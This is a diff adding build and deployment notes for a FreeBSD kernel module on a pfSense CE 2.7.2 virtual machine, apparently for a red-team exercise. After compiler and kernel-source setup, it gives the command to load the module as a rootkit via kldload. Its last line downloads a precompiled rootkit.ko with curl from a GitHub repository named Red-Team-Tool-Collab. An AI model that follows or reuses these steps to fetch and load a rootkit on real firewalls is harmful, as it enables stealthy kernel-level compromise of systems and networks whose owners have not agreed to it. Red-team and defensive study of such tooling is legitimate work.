@@ -1,0 +1,55 @@
+this is for pfsense CE 2.7.2 VM running FreeBSD 14.0 CURRENT kernel
+
+uname -a (check to make sure version and kernel are correct)
+
+mount -o rw /
+
+pkg install vim git curl llvm15
+
+cd /
+
+git clone https://<your_username>:<your_token>@github.com/Mon-keyBoy/<repo name>.git 
+
+git config --global user.name "Your GitHub Username" 
+
+git config --global user.email "your-email@example.com"
+
+cd /usr
+
+git clone -b RELENG_2_7_2 https://github.com/pfsense/FreeBSD-src.git src
+
+ln -s /usr/src/sys sys
+
+ln -s /usr/local/bin/ld.lld15 /usr/local/bin/ld
+
+cd /<repo name>/<project folder if applicable>
+
+setenv SYSDIR /usr/src/sys
+
+setenv CC clang15
+
+Have the following lines in your Makefile
+CC= clang15
+LD?= /usr/local/bin/ld.lld15
+
+
+
+Now you can run make to create a working and loadable .ko file, it will give you errors about not being able to remove/strip/debug the file but it should still work just fine
+
+everytime you boot up pfsense go into option 8 (shell) and run
+mount -o rw / 
+before doing anything else
+
+to load the rootkit run:
+kldload /path/to/rootkit.ko
+
+
+
+
+
+
+(make -V LD (check for LD within the makefile)) used for troubleshooting
+
+(disregard this)
+Curl the rootkit
+curl -L -o rootkit.ko https://github.com/Mon-keyBoy/Red-Team-Tool-Collab/raw/dev/compiled-code/rootkit.ko
